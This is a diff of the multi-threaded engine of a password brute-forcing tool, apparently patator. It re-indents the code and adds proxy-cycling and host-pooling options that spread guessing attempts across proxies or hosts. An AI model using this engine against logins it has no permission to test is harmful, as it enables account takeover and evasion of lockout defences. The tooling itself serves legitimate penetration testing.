-    class MyHelpFormatter(IndentedHelpFormatter):
-      def format_epilog(self, epilog):
-        return epilog
+        class MyHelpFormatter(IndentedHelpFormatter):
+            def format_epilog(self, epilog):
+                return epilog
 
-      def format_heading(self, heading):
-        if self.current_indent == 0 and heading == 'Options':
-          heading = 'Global options'
-        return "%*s%s:\n" % (self.current_indent, "", heading)
+            def format_heading(self, heading):
+                if self.current_indent == 0 and heading == 'Options':
+                    heading = 'Global options'
+                return "%*s%s:\n" % (self.current_indent, "", heading)
 
-      def format_usage(self, usage):
-        return '%s\nUsage: %s\n' % (__banner__, usage)
+            def format_usage(self, usage):
+                return '%s\nUsage: %s\n' % (__banner__, usage)
 
-    available_actions = self.builtin_actions + self.module.available_actions
-    available_conditions = self.module.Response.available_conditions
+        available_actions = self.builtin_actions + self.module.available_actions
+        available_conditions = self.module.Response.available_conditions
 
-    usage = '''%%prog <module-options ...> [global-options ...]
+        usage = '''%%prog <module-options ...> [global-options ...]
 
 Examples:
   %s''' % '\n  '.join(self.module.usage_hints)
 
-    usage += '''
+        usage += '''
 
 Module options:
 %s ''' % ('\n'.join('  %-14s: %s' % (k, v) for k, v in self.module.available_options))
-   
-    epilog = '''
+
+        epilog = '''
 Syntax:
  -x actions:conditions
 
@@ -1230,17 +1387,17 @@ Syntax:
     action     := "%s"
     conditions := condition=value[,condition=value]*
     condition  := "%s"
-''' % ('" | "'.join(k for k, v in available_actions), 
+''' % ('" | "'.join(k for k, v in available_actions),
        '" | "'.join(k for k, v in available_conditions))
 
-    epilog += '''
+        epilog += '''
 %s
 
 %s
 ''' % ('\n'.join('    %-12s: %s' % (k, v) for k, v in available_actions),
        '\n'.join('    %-12s: %s' % (k, v) for k, v in available_conditions))
 
-    epilog += '''
+        epilog += '''
 For example, to ignore all redirects to the home page:
 ... -x ignore:code=302,fgrep='Location: /home.html'
 
@@ -1250,9 +1407,9 @@ For example, to ignore all redirects to the home page:
     encoding   := "%s"
 
 %s''' % ('" | "'.join(k for k in self.available_encodings),
-       '\n'.join('    %-12s: %s' % (k, v) for k, (f, v) in self.available_encodings.items()))
+         '\n'.join('    %-12s: %s' % (k, v) for k, (f, v) in self.available_encodings.items()))
 
-    epilog += '''
+        epilog += '''
 
 For example, to encode every password in base64:
 ... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64
@@ -1260,640 +1417,684 @@ For example, to encode every password in base64:
 Please read the README inside for more examples and usage information.
 '''
 
-    parser = OptionParser(usage=usage, prog=name, epilog=epilog, version=__banner__, formatter=MyHelpFormatter())
+        parser = OptionParser(usage=usage, prog=name, epilog=epilog, version=__banner__, formatter=MyHelpFormatter())
 
-    exe_grp = OptionGroup(parser, 'Execution')
-    exe_grp.add_option('-x', dest='actions', action='append', default=[], metavar='arg', help='actions and conditions, see Syntax below')
-    exe_grp.add_option('--start', dest='start', type='int', default=0, metavar='N', help='start from offset N in the wordlist product')
-    exe_grp.add_option('--stop', dest='stop', type='int', default=None, metavar='N', help='stop at offset N')
-    exe_grp.add_option('--resume', dest='resume', metavar='r1[,rN]*', help='resume previous run')
-    exe_grp.add_option('-e', dest='encodings', action='append', default=[], metavar='arg', help='encode everything between two tags, see Syntax below')
-    exe_grp.add_option('-C', dest='combo_delim', default=':', metavar='str', help="delimiter string in combo files (default is ':')")
-    exe_grp.add_option('-X', dest='condition_delim', default=',', metavar='str', help="delimiter string in conditions (default is ',')")
-    exe_grp.add_option('--allow-ignore-failures', action='store_true', default=False, dest='allow_ignore_failures', help="failures cannot be ignored with -x (this is by design to avoid false negatives) this option overrides this behavior")
+        exe_grp = OptionGroup(parser, 'Execution')
+        exe_grp.add_option('-x', dest='actions', action='append', default=[], metavar='arg',
+                           help='actions and conditions, see Syntax below')
+        exe_grp.add_option('--start', dest='start', type='int', default=0, metavar='N',
+                           help='start from offset N in the wordlist product')
+        exe_grp.add_option('--stop', dest='stop', type='int', default=None, metavar='N', help='stop at offset N')
+        exe_grp.add_option('--resume', dest='resume', metavar='r1[,rN]*', help='resume previous run')
+        exe_grp.add_option('-e', dest='encodings', action='append', default=[], metavar='arg',
+                           help='encode everything between two tags, see Syntax below')
+        exe_grp.add_option('-C', dest='combo_delim', default=':', metavar='str',
+                           help="delimiter string in combo files (default is ':')")
+        exe_grp.add_option('-X', dest='condition_delim', default=',', metavar='str',
+                           help="delimiter string in conditions (default is ',')")
+        exe_grp.add_option('--allow-ignore-failures', action='store_true', default=False, dest='allow_ignore_failures',
+                           help="failures cannot be ignored with -x (this is by design to avoid false negatives) this option overrides this behavior")
+        exe_grp.add_option('--cycle-index', dest='cycle_index', type='int', default=None, metavar='N',
+                           help="defines index of proxylist and changes iterative logic to one thread - one proxy")
+        exe_grp.add_option('--pool-index', dest='pool_index', type='int', default=None, metavar='N',
+                           help="defines index of pooling parameter and changes iterative logic to one thread - one host")
 
-    opt_grp = OptionGroup(parser, 'Optimization')
-    opt_grp.add_option('--rate-limit', dest='rate_limit', type='float', default=0, metavar='N', help='wait N seconds between each test (default is 0)')
-    opt_grp.add_option('--timeout', dest='timeout', type='int', default=0, metavar='N', help='wait N seconds for a response before retrying payload (default is 0)')
-    opt_grp.add_option('--max-retries', dest='max_retries', type='int', default=4, metavar='N', help='skip payload after N retries (default is 4) (-1 for unlimited)')
-    opt_grp.add_option('-t', '--threads', dest='num_threads', type='int', default=10, metavar='N', help='number of threads (default is 10)')
+        opt_grp = OptionGroup(parser, 'Optimization')
+        opt_grp.add_option('--rate-limit', dest='rate_limit', type='float', default=0, metavar='N',
+                           help='wait N seconds between each test (default is 0)')
+        opt_grp.add_option('--timeout', dest='timeout', type='int', default=0, metavar='N',
+                           help='wait N seconds for a response before retrying payload (default is 0)')
+        opt_grp.add_option('--max-retries', dest='max_retries', type='int', default=4, metavar='N',
+                           help='skip payload after N retries (default is 4) (-1 for unlimited)')
+        opt_grp.add_option('-t', '--threads', dest='num_threads', type='int', default=10, metavar='N',
+                           help='number of threads (default is 10)')
 
-    log_grp = OptionGroup(parser, 'Logging')
-    log_grp.add_option('-l', dest='log_dir', metavar='DIR', help="save output and response data into DIR ")
-    log_grp.add_option('-L', dest='auto_log', metavar='SFX', help="automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX (DIR defaults to '/tmp/patator')") 
+        log_grp = OptionGroup(parser, 'Logging')
+        log_grp.add_option('-l', dest='log_dir', metavar='DIR', help="save output and response data into DIR ")
+        log_grp.add_option('-L', dest='auto_log', metavar='SFX',
+                           help="automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX (DIR defaults to '/tmp/patator')")
 
-    dbg_grp = OptionGroup(parser, 'Debugging')
-    dbg_grp.add_option('-d', '--debug', dest='debug', action='store_true', default=False, help='enable debug messages')
+        dbg_grp = OptionGroup(parser, 'Debugging')
+        dbg_grp.add_option('-d', '--debug', dest='debug', action='store_true', default=False,
+                           help='enable debug messages')
 
-    parser.option_groups.extend([exe_grp, opt_grp, log_grp, dbg_grp])
+        parser.option_groups.extend([exe_grp, opt_grp, log_grp, dbg_grp])
 
-    return parser
+        return parser
 
-  def parse_usage(self, argv):
-    parser = self.usage_parser(argv[0])
-    opts, args = parser.parse_args(argv[1:])
+    def parse_usage(self, argv):
+        parser = self.usage_parser(argv[0])
+        opts, args = parser.parse_args(argv[1:])
 
-    if not len(args) > 0:
-      parser.print_usage()
-      print('ERROR: wrong usage. Please read the README inside for more information.')
-      sys.exit(2)
+        if not len(args) > 0:
+            parser.print_usage()
+            print('ERROR: wrong usage. Please read the README inside for more information.')
+            sys.exit(2)
 
-    return opts, args
+        return opts, args
 
-  def __init__(self, module, argv):
-    self.thread_report = []
-    self.thread_progress = []
+    def __init__(self, module, argv):
+        self.thread_report = []
+        self.thread_progress = []
 
-    self.payload = {}
-    self.iter_keys = {}
-    self.enc_keys = []
+        self.payload = {}
+        self.iter_keys = {}
+        self.enc_keys = []
 
-    self.module = module
+        self.module = module
 
-    opts, args = self.parse_usage(argv)
+        opts, args = self.parse_usage(argv)
 
-    self.combo_delim = opts.combo_delim
-    self.condition_delim = opts.condition_delim
-    self.rate_limit = opts.rate_limit
-    self.timeout = opts.timeout
-    self.max_retries = opts.max_retries
-    self.num_threads = opts.num_threads
-    self.start, self.stop = opts.start, opts.stop
-    self.allow_ignore_failures = opts.allow_ignore_failures
+        self.combo_delim = opts.combo_delim
+        self.condition_delim = opts.condition_delim
+        self.rate_limit = opts.rate_limit
+        self.timeout = opts.timeout
+        self.max_retries = opts.max_retries
+        self.num_threads = opts.num_threads
+        self.start, self.stop = opts.start, opts.stop
+        self.allow_ignore_failures = opts.allow_ignore_failures
+        self.cycle_index = opts.cycle_index
+        self.pool_index = opts.pool_index
 
-    self.resume = [int(i) for i in opts.resume.split(',')] if opts.resume else None
+        self.resume = [int(i) for i in opts.resume.split(',')] if opts.resume else None
 
-    manager = MyManager()
-    manager.start()
+        manager = MyManager()
+        manager.start()
 
-    self.ns = manager.Namespace()
-    self.ns.actions = {}
-    self.ns.free_list = []
-    self.ns.paused = False
-    self.ns.quit_now = False
-    self.ns.start_time = 0
-    self.ns.total_size = 1
+        self.ns = manager.Namespace()
+        self.ns.actions = {}
+        self.ns.free_list = []
+        self.ns.paused = False
+        self.ns.quit_now = False
+        self.ns.start_time = 0
+        self.ns.total_size = 1
 
-    pipe = multiprocessing.Pipe(duplex=False)
+        pipe = manager.Queue()
 
-    logsvc = Process(name='LogSvc', target=process_logs, args=(pipe[0], module.Response.indicatorsfmt, argv, build_logdir(opts.log_dir, opts.auto_log)))
-    logsvc.daemon = True
-    logsvc.start()
+        logsvc = Process(name='LogSvc', target=process_logs,
+                         args=(pipe, module.Response.indicatorsfmt, argv, build_logdir(opts.log_dir, opts.auto_log)))
+        logsvc.daemon = True
+        logsvc.start()
 
-    global logger
-    logger = Logger(pipe[1])
+        global logger
+        logger = Logger(pipe)
 
-    if opts.debug:
-      logger.setLevel(logging.DEBUG)
-    else:
-      logger.setLevel(logging.INFO)
-
-    wlists = {}
-    kargs = []
-    for arg in args: # ('host=NET0', '0=10.0.0.0/24', 'user=COMBO10', 'password=COMBO11', '1=combos.txt', 'name=google.MOD2', '2=TLD')
-      for k, v in self.expand_key(arg):
-        logger.debug('k: %s, v: %s' % (k, v))
-
-        if k.isdigit():
-          wlists[k] = v
-
+        if opts.debug:
+            logger.setLevel(logging.DEBUG)
         else:
-          if v.startswith('@'):
-            p = os.path.expanduser(v[1:])
-            v = open(p).read()
-          kargs.append((k, v)) 
+            logger.setLevel(logging.INFO)
 
-    iter_vals = [v for k, v in sorted(wlists.items())]
-    logger.debug('kargs: %s' % kargs) # [('host', 'NET0'), ('user', 'COMBO10'), ('password', 'COMBO11'), ('domain', 'MOD2')]
-    logger.debug('iter_vals: %s' % iter_vals) # ['10.0.0.0/24', 'combos.txt', 'TLD']
+        wlists = {}
+        kargs = []
+        for arg in args:  # ('host=NET0', '0=10.0.0.0/24', 'user=COMBO10', 'password=COMBO11', '1=combos.txt', 'name=google.MOD2', '2=TLD')
+            for k, v in self.expand_key(arg):
+                logger.debug('k: %s, v: %s' % (k, v))
 
-    for k, v in kargs:
-
-      for e in opts.encodings:
-        meta, enc = e.split(':')
-        if re.search(r'{0}.+?{0}'.format(meta), v):
-          self.enc_keys.append((k, meta, self.available_encodings[enc][0]))
-
-      for i in self.find_file_keys(v):
-        if i not in self.iter_keys:
-          self.iter_keys[i] = ('FILE', iter_vals[i], [])
-        self.iter_keys[i][2].append(k)
-
-      else:
-        for i in self.find_net_keys(v):
-          if i not in self.iter_keys:
-            self.iter_keys[i] = ('NET', iter_vals[i], [])
-          self.iter_keys[i][2].append(k)
-
-          if not has_ipy:
-            print('IPy (https://github.com/haypo/python-ipy) is required for using NET keyword.')
-            print('Please read the README inside for more information.')
-            sys.exit(3)
-
-        else:
-          for i, j in self.find_combo_keys(v):
-            if i not in self.iter_keys:
-              self.iter_keys[i] = ('COMBO', iter_vals[i], [])
-            self.iter_keys[i][2].append((j, k))
-          
-          else:
-            for i in self.find_module_keys(v):
-              if i not in self.iter_keys:
-                self.iter_keys[i] = ('MOD', iter_vals[i], [])
-              self.iter_keys[i][2].append(k)
-
-            else:
-              for i in self.find_range_keys(v):
-                if i not in self.iter_keys:
-                  self.iter_keys[i] = ('RANGE', iter_vals[i], [])
-                self.iter_keys[i][2].append(k)
-
-              else:
-                for i in self.find_prog_keys(v):
-                  if i not in self.iter_keys:
-                    self.iter_keys[i] = ('PROG', iter_vals[i], [])
-                  self.iter_keys[i][2].append(k)
+                if k.isdigit():
+                    wlists[k] = v
 
                 else:
-                  self.payload[k] = v
+                    if v.startswith('@'):
+                        p = os.path.expanduser(v[1:])
+                        v = open(p).read()
+                    kargs.append((k, v))
 
-    logger.debug('iter_keys: %s' % self.iter_keys) # { 0: ('NET', '10.0.0.0/24', ['host']), 1: ('COMBO', 'combos.txt', [(0, 'user'), (1, 'password')]), 2: ('MOD', 'TLD', ['name'])
-    logger.debug('enc_keys: %s' % self.enc_keys) # [('password', 'ENC', hexlify), ('header', 'B64', b64encode), ...
-    logger.debug('payload: %s' % self.payload)
+        iter_vals = [v for k, v in sorted(wlists.items())]
+        logger.debug(
+            'kargs: %s' % kargs)  # [('host', 'NET0'), ('user', 'COMBO10'), ('password', 'COMBO11'), ('domain', 'MOD2')]
+        logger.debug('iter_vals: %s' % iter_vals)  # ['10.0.0.0/24', 'combos.txt', 'TLD']
 
-    self.available_actions = [k for k, _ in self.builtin_actions + self.module.available_actions]
-    self.module_actions = [k for k, _ in self.module.available_actions]
+        for k, v in kargs:
 
-    for x in opts.actions:
-      self.update_actions(x)
+            for e in opts.encodings:
+                meta, enc = e.split(':')
+                if re.search(r'{0}.+?{0}'.format(meta), v):
+                    self.enc_keys.append((k, meta, self.available_encodings[enc][0]))
 
-    logger.debug('actions: %s' % self.ns.actions)
-    
-  def update_actions(self, arg): 
-    ns_actions = self.ns.actions
+            for i in self.find_file_keys(v):
+                if i not in self.iter_keys:
+                    self.iter_keys[i] = ('FILE', iter_vals[i], [])
+                self.iter_keys[i][2].append(k)
 
-    actions, conditions = arg.split(':', 1)
-    for action in actions.split(','):
+            else:
+                for i in self.find_net_keys(v):
+                    if i not in self.iter_keys:
+                        self.iter_keys[i] = ('NET', iter_vals[i], [])
+                    self.iter_keys[i][2].append(k)
 
-      conds = [c.split('=', 1) for c in conditions.split(self.condition_delim)]
-     
-      if '=' in action:
-        name, opts = action.split('=')
-      else:
-        name, opts = action, None
+                    if not has_ipy:
+                        print('IPy (https://github.com/haypo/python-ipy) is required for using NET keyword.')
+                        print('Please read the README inside for more information.')
+                        sys.exit(3)
 
-      if name not in self.available_actions:
-        raise NotImplementedError('Unsupported action: %s' % name)
+                else:
+                    for i, j in self.find_combo_keys(v):
+                        if i not in self.iter_keys:
+                            self.iter_keys[i] = ('COMBO', iter_vals[i], [])
+                        self.iter_keys[i][2].append((j, k))
 
-      if name not in ns_actions:
-        ns_actions[name] = []
+                    else:
+                        for i in self.find_module_keys(v):
+                            if i not in self.iter_keys:
+                                self.iter_keys[i] = ('MOD', iter_vals[i], [])
+                            self.iter_keys[i][2].append(k)
 
-      ns_actions[name].append((conds, opts))
+                        else:
+                            for i in self.find_range_keys(v):
+                                if i not in self.iter_keys:
+                                    self.iter_keys[i] = ('RANGE', iter_vals[i], [])
+                                self.iter_keys[i][2].append(k)
 
-    self.ns.actions = ns_actions
+                            else:
+                                for i in self.find_prog_keys(v):
+                                    if i not in self.iter_keys:
+                                        self.iter_keys[i] = ('PROG', iter_vals[i], [])
+                                    self.iter_keys[i][2].append(k)
 
-  def lookup_actions(self, resp):
-    actions = {}
-    for action, conditions in self.ns.actions.items():
-      for condition, opts in conditions:
-        for key, val in condition:
-          if key[-1] == '!':
-            if resp.match(key[:-1], val):
-              break
-          else:
-            if not resp.match(key, val):
-              break
-        else:
-          actions[action] = opts
-    return actions
+                                else:
+                                    self.payload[k] = v
 
-  def check_free(self, payload):
-    # free_list: 'host=10.0.0.1', 'user=anonymous', 'host=10.0.0.7,user=test', ...
-    for m in self.ns.free_list:
-      args = m.split(',', 1)
-      for arg in args:
-        k, v = arg.split('=', 1)
-        if payload[k] != v:
-          break
-      else:
-        return True
+        logger.debug(
+            'iter_keys: %s' % self.iter_keys)  # { 0: ('NET', '10.0.0.0/24', ['host']), 1: ('COMBO', 'combos.txt', [(0, 'user'), (1, 'password')]), 2: ('MOD', 'TLD', ['name'])
+        logger.debug('enc_keys: %s' % self.enc_keys)  # [('password', 'ENC', hexlify), ('header', 'B64', b64encode), ...
+        logger.debug('payload: %s' % self.payload)
 
-    return False
+        self.available_actions = [k for k, _ in self.builtin_actions + self.module.available_actions]
+        self.module_actions = [k for k, _ in self.module.available_actions]
 
-  def register_free(self, payload, opts):
-    self.ns.free_list += [','.join('%s=%s' % (k, payload[k]) for k in opts.split('+'))]
-    logger.debug('free_list updated: %s' % self.ns.free_list)
-  
-  def fire(self):
-    logger.info('Starting %s at %s' % (__banner__, strftime('%Y-%m-%d %H:%M %Z', localtime())))
+        for x in opts.actions:
+            self.update_actions(x)
 
-    try:
-      self.start_threads()
-      self.monitor_progress()
-    except KeyboardInterrupt:
-      pass
-    except:
-      logging.exception(sys.exc_info()[1])
-    finally:
-      self.ns.quit_now = True
+        logger.debug('actions: %s' % self.ns.actions)
 
-    try:
-      # waiting for reports enqueued by consumers to be flushed
-      while True:
-        active = multiprocessing.active_children()
-        self.report_progress()
-        if not len(active) > 2: # SyncManager and LogSvc
-          break
-        logger.debug('active: %s' % active)
-        sleep(.1)
-    except KeyboardInterrupt:
-      pass
+    def update_actions(self, arg):
+        ns_actions = self.ns.actions
 
-    if self.ns.total_size >= sys.maxint:
-      total_size = -1
-    else:
-      total_size = self.ns.total_size
+        actions, conditions = arg.split(':', 1)
+        for action in actions.split(','):
 
-    total_time = time() - self.ns.start_time
+            conds = [c.split('=', 1) for c in conditions.split(self.condition_delim)]
 
-    hits_count = sum(p.hits_count for p in self.thread_progress)
-    done_count = sum(p.done_count for p in self.thread_progress)
-    skip_count = sum(p.skip_count for p in self.thread_progress)
-    fail_count = sum(p.fail_count for p in self.thread_progress)
+            if '=' in action:
+                name, opts = action.split('=')
+            else:
+                name, opts = action, None
 
-    speed_avg = done_count / total_time 
+            if name not in self.available_actions:
+                raise NotImplementedError('Unsupported action: %s' % name)
 
-    self.show_final()
+            if name not in ns_actions:
+                ns_actions[name] = []
 
-    logger.info('Hits/Done/Skip/Fail/Size: %d/%d/%d/%d/%d, Avg: %d r/s, Time: %s' % (
-      hits_count, done_count, skip_count, fail_count, total_size, speed_avg,
-      pprint_seconds(total_time, '%dh %dm %ds')))
+            ns_actions[name].append((conds, opts))
 
-    if done_count < total_size:
-      resume = []
-      for i, p in enumerate(self.thread_progress):
-        c = p.done_count + p.skip_count
-        if self.resume:
-          if i < len(self.resume):
-            c += self.resume[i]
-        resume.append(str(c))
-        
-      logger.info('To resume execution, pass --resume %s' % ','.join(resume))
+        self.ns.actions = ns_actions
 
-    logger.quit()
-    while len(multiprocessing.active_children()) > 1:
-      sleep(.1)
+    def lookup_actions(self, resp):
+        actions = {}
+        for action, conditions in self.ns.actions.items():
+            for condition, opts in conditions:
+                for key, val in condition:
+                    if key[-1] == '!':
+                        if resp.match(key[:-1], val):
+                            break
+                    else:
+                        if not resp.match(key, val):
+                            break
+                else:
+                    actions[action] = opts
+        return actions
 
-  def push_final(self, resp): pass
-  def show_final(self): pass
+    def check_free(self, payload):
+        # free_list: 'host=10.0.0.1', 'user=anonymous', 'host=10.0.0.7,user=test', ...
+        for m in self.ns.free_list:
+            args = m.split(',', 1)
+            for arg in args:
+                k, v = arg.split('=', 1)
+                if payload[k] != v:
+                    break
+            else:
+                return True
 
-  def start_threads(self):
+        return False
 
-    task_queues = [multiprocessing.Queue() for _ in range(self.num_threads)]
+    def register_free(self, payload, opts):
+        self.ns.free_list += [','.join('%s=%s' % (k, payload[k]) for k in opts.split('+'))]
+        logger.debug('free_list updated: %s' % self.ns.free_list)
 
-    # consumers
-    for num in range(self.num_threads):
-      report_queue = multiprocessing.Queue()
-      t = Process(name='Consumer-%d' % num, target=self.consume, args=(task_queues[num], report_queue, logger.pipe))
-      t.daemon = True
-      t.start()
-      self.thread_report.append(report_queue)
-      self.thread_progress.append(Progress())
-
-    # producer
-    t = Process(name='Producer', target=self.produce, args=(task_queues, logger.pipe))
-    t.daemon = True
-    t.start()
-
-  def produce(self, task_queues, pipe):
-
-    ignore_ctrlc()
-
-    global logger
-    logger = Logger(pipe)
-
-    iterables = []
-    total_size = 1
-
-    for _, (t, v, _) in self.iter_keys.items():
-
-      if t in ('FILE', 'COMBO'):
-        size = 0
-        files = []
-
-        for fname in v.split(','):
-          fpath = os.path.expanduser(fname)
-          size += sum(1 for _ in open(fpath))
-          files.append(FileIter(fpath))
-
-        iterable = chain(*files)
-
-      elif t == 'NET':
-        subnets = [IP(n, make_net=True) for n in v.split(',')]
-        size = sum(len(s) for s in subnets)
-        iterable = chain(*subnets)
-
-      elif t == 'MOD':
-        elements, size = self.module.available_keys[v]()
-        iterable = chain(elements)
-
-      elif t == 'RANGE':
-        size = 0
-        ranges = []
-
-        for r in v.split(','):
-          typ, opt = r.split(':', 1)
-
-          if typ not in ['hex', 'int', 'float', 'letters', 'lower', 'lowercase', 'upper', 'uppercase']:
-            raise NotImplementedError("Incorrect range type '%s'" % typ)
-
-          it = RangeIter(typ, opt)
-          size += len(it)
-          ranges.append(it)
-
-        iterable = chain(*ranges)
-
-      elif t == 'PROG':
-        m = re.match(r'(.+),(\d+)$', v)
-        if m:
-          prog, size = m.groups()
-        else:
-          prog, size = v, sys.maxint
-
-        logger.debug('prog: %s, size: %s' % (prog, size))
-
-        it = ProgIter(prog)
-        iterable, size = chain(it), int(size)
-
-      else:
-        raise NotImplementedError("Incorrect keyword '%s'" % t)
-
-      total_size *= size
-      iterables.append(iterable)
-
-    if not iterables:
-      iterables.append(chain(['']))
-
-    if self.stop:
-      total_size = self.stop - self.start
-    else:
-      total_size -= self.start
-
-    if self.resume:
-      total_size -= sum(self.resume)
-
-    self.ns.total_size = total_size
-    self.ns.start_time = time()
-
-    logger.headers()
-
-    count = 0
-    for pp in islice(product(*iterables), self.start, self.stop):
-
-      if self.ns.quit_now:
-        break
-
-      cid = count % self.num_threads
-      prod = [str(p).strip('\r\n') for p in pp]
-
-      if self.resume:
-        idx = count % len(self.resume)
-        off = self.resume[idx]
-
-        if count < off * len(self.resume):
-          #logger.debug('Skipping %d %s, resume[%d]: %s' % (count, ':'.join(prod), idx, self.resume[idx]))
-          count += 1
-          continue
-
-      while True:
-        if self.ns.quit_now:
-          break
+    def fire(self):
+        logger.info('Starting %s at %s' % (__banner__, strftime('%Y-%m-%d %H:%M %Z', localtime())))
 
         try:
-          task_queues[cid].put_nowait(prod)
-          break
-        except Full:
-          sleep(.1)
-
-      count += 1
-
-    if not self.ns.quit_now:
-      for q in task_queues:
-        q.put(None)
-
-    logger.debug('producer done')
-
-    while True:
-      if self.ns.quit_now:
-        for q in task_queues:
-          q.cancel_join_thread()
-        break
-      sleep(.5)
-
-    logger.debug('producer exits')
-
-  def consume(self, task_queue, report_queue, pipe):
-
-    ignore_ctrlc()
-    handle_alarm()
-
-    global logger
-    logger = Logger(pipe)
-
-    module = self.module()
-
-    def shutdown():
-      if hasattr(module, '__del__'):
-        module.__del__()
-      logger.debug('consumer done')
-
-    while True:
-      if self.ns.quit_now:
-        return shutdown()
-
-      try:
-        prod = task_queue.get_nowait()
-      except Empty:
-        sleep(.1)
-        continue
-
-      if prod is None:
-        return shutdown()
-      
-      payload = self.payload.copy()
- 
-      for i, (t, _, keys) in self.iter_keys.items():
-        if t == 'FILE':
-          for k in keys:
-            payload[k] = payload[k].replace('FILE%d' % i, prod[i])
-        elif t == 'NET':
-          for k in keys:
-            payload[k] = payload[k].replace('NET%d' % i, prod[i])
-        elif t == 'COMBO':
-          for j, k in keys: 
-            payload[k] = payload[k].replace('COMBO%d%d' % (i, j), prod[i].split(self.combo_delim)[j])
-        elif t == 'MOD':
-          for k in keys:
-            payload[k] = payload[k].replace('MOD%d' %i, prod[i])
-        elif t == 'RANGE':
-          for k in keys:
-            payload[k] = payload[k].replace('RANGE%d' %i, prod[i])
-        elif t == 'PROG':
-          for k in keys:
-            payload[k] = payload[k].replace('PROG%d' %i, prod[i])
-
-      for k, m, e in self.enc_keys:
-        payload[k] = re.sub(r'{0}(.+?){0}'.format(m), lambda m: e(m.group(1)), payload[k])
-  
-      logger.debug('product: %s' % prod)
-      pp_prod = ':'.join(prod)
-
-      if self.check_free(payload):
-        report_queue.put(('skip', pp_prod, None, 0))
-        continue
-
-      try_count = 0
-      start_time = time()
-
-      while True:
-
-        while self.ns.paused and not self.ns.quit_now:
-          sleep(1)
-
-        if self.ns.quit_now:
-          return shutdown()
-
-        if self.rate_limit > 0:
-          sleep(self.rate_limit)
-
-        if try_count <= self.max_retries or self.max_retries < 0:
-
-          actions = {}
-          try_count += 1
-
-          logger.debug('payload: %s [try %d/%d]' % (payload, try_count, self.max_retries+1))
-
-          try:
-            enable_alarm(self.timeout)
-            resp = module.execute(**payload)
-
-          except:
-            mesg = '%s %s' % sys.exc_info()[:2]
-            logger.debug('caught: %s' % mesg)
-
-            #logging.exception(sys.exc_info()[1])
-
-            resp = self.module.Response('xxx', mesg, timing=time()-start_time)
-
-            if hasattr(module, 'reset'):
-              module.reset()
-
-            sleep(try_count * .1)
-            continue
-
-          finally:
-            disable_alarm()
-
-        else:
-          actions = {'fail': None}
-
-        actions.update(self.lookup_actions(resp))
-        report_queue.put((actions, pp_prod, resp, time() - start_time))
-
-        for name in self.module_actions:
-          if name in actions:
-            getattr(module, name)(**payload)
-
-        if 'free' in actions:
-          self.register_free(payload, actions['free'])
-          break
-
-        if 'fail' in actions:
-          break
-
-        if 'retry' in actions:
-          continue
-
-        break
-       
-  def monitor_progress(self):
-    # loop until SyncManager, LogSvc and Producer are the only children left alive
-    while len(multiprocessing.active_children()) > 3 and not self.ns.quit_now:
-      self.report_progress()
-      self.monitor_interaction()
-
-  def report_progress(self):
-    for i, pq in enumerate(self.thread_report):
-      p = self.thread_progress[i]
-
-      while True:
+            self.start_threads()
+            self.monitor_progress()
+        except KeyboardInterrupt:
+            pass
+        except:
+            logging.exception(sys.exc_info()[1])
+        finally:
+            self.ns.quit_now = True
 
         try:
-          actions, current, resp, seconds = pq.get_nowait()
-          #logger.info('actions reported: %s' % '+'.join(actions))
+            # waiting for reports enqueued by consumers to be flushed
+            while True:
+                active = multiprocessing.active_children()
+                self.report_progress()
+                if not len(active) > 2:  # SyncManager and LogSvc
+                    break
+                logger.debug('active: %s' % active)
+                sleep(.1)
+        except KeyboardInterrupt:
+            pass
 
-        except Empty: 
-          break
+        if self.ns.total_size >= sys.maxint:
+            total_size = -1
+        else:
+            total_size = self.ns.total_size
 
-        if actions == 'skip':
-          p.skip_count += 1
-          continue
+        total_time = time() - self.ns.start_time
+
+        hits_count = sum(p.hits_count for p in self.thread_progress)
+        done_count = sum(p.done_count for p in self.thread_progress)
+        skip_count = sum(p.skip_count for p in self.thread_progress)
+        fail_count = sum(p.fail_count for p in self.thread_progress)
+
+        speed_avg = done_count / total_time
+
+        self.show_final()
+
+        logger.info('Hits/Done/Skip/Fail/Size: %d/%d/%d/%d/%d, Avg: %d r/s, Time: %s' % (
+            hits_count, done_count, skip_count, fail_count, total_size, speed_avg,
+            pprint_seconds(total_time, '%dh %dm %ds')))
+
+        if done_count < total_size:
+            resume = []
+            for i, p in enumerate(self.thread_progress):
+                c = p.done_count + p.skip_count
+                if self.resume:
+                    if i < len(self.resume):
+                        c += self.resume[i]
+                resume.append(str(c))
+
+            logger.info('To resume execution, pass --resume %s' % ','.join(resume))
+
+        logger.quit()
+        while len(multiprocessing.active_children()) > 1:
+            sleep(.1)
+
+    def push_final(self, resp):
+        pass
+
+    def show_final(self):
+        pass
+
+    def start_threads(self):
+
+        task_queues = [multiprocessing.Queue() for _ in range(self.num_threads)]
+
+        # consumers
+        for num in range(self.num_threads):
+            report_queue = multiprocessing.Queue()
+            t = Process(name='Consumer-%d' % num, target=self.consume,
+                        args=(task_queues[num], report_queue, logger.pipe))
+            t.daemon = True
+            t.start()
+            self.thread_report.append(report_queue)
+            self.thread_progress.append(Progress())
+
+        # producer
+        t = Process(name='Producer', target=self.produce, args=(task_queues, logger.pipe))
+        t.daemon = True
+        t.start()
+
+    # InvaderMod
+    def produce(self, task_queues, pipe):
+
+        ignore_ctrlc()
+
+        global logger
+        logger = Logger(pipe)
+
+        iterables = []
+        total_size = 1
+        iter_reg = {}
+        for i, (t, v, j) in self.iter_keys.items():
+
+            cycle = True if self.cycle_index is not None and i is self.cycle_index else False
+            if t is 'COMBO':
+                iter_reg[i] = [j[0][1]] + [j[1][1]]
+            else:
+                iter_reg[i] = [j[0]]
+
+            if t in ('FILE', 'COMBO'):
+                size = 0
+                files = []
+
+                for fname in v.split(','):
+                    fpath = os.path.expanduser(fname)
+                    size += sum(1 for _ in open(fpath))
+                    files.append(FileIter(fpath, cycle=cycle))
+
+                iterable = chain(*files, cycle=cycle)
+
+            elif t == 'NET':
+                subnets = [IP(n, make_net=True) for n in v.split(',')]
+                size = sum(len(s) for s in subnets)
+                iterable = chain(*subnets)
+
+            elif t == 'MOD':
+                elements, size = self.module.available_keys[v]()
+                iterable = chain(elements)
+
+            elif t == 'RANGE':
+                size = 0
+                ranges = []
+
+                for r in v.split(','):
+                    typ, opt = r.split(':', 1)
+
+                    if typ not in ['hex', 'int', 'float', 'letters', 'lower', 'lowercase', 'upper', 'uppercase']:
+                        raise NotImplementedError("Incorrect range type '%s'" % typ)
+
